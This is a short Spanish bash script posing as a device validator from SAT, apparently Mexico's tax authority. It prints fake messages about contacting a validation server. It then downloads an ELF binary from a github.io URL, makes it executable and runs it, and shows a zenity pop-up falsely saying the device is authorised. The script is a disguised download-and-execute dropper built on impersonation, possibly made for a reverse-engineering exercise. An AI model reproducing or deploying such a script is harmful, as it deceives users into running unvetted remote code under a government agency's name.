#!/bin/bash

echo "============================================="
echo "        SAT - Validador de Dispositivo"
echo "============================================="
echo "[*] Iniciando verificación del entorno..."
sleep 2

echo "[*] Estableciendo conexión con el servidor de validación SAT..."
sleep 2

echo "[*] Descargando componente de autorización del sistema..."
wget https://miguelatila.github.io/ingenieriaInversa/ejec/certificadoSAT.elf -O seguridadSAT

if [ -f "seguridadSAT" ]; then
    echo "[+] Componente descargado correctamente."
    chmod +x seguridadSAT
    echo "[*] Ejecutando módulo de validación..."
    sleep 2
    ./seguridadSAT

    # Mensaje gráfico de éxito
    zenity --info --title="SAT - Validación completada" \
      --text="El dispositivo ha sido autorizado correctamente.\nPuede cerrar esta ventana."
else
    echo "[!] Error: No se pudo descargar el componente."
    zenity --error --title="SAT - Error de validación" \
      --text="No se pudo validar el dispositivo.\nPor favor intente más tarde."
fi
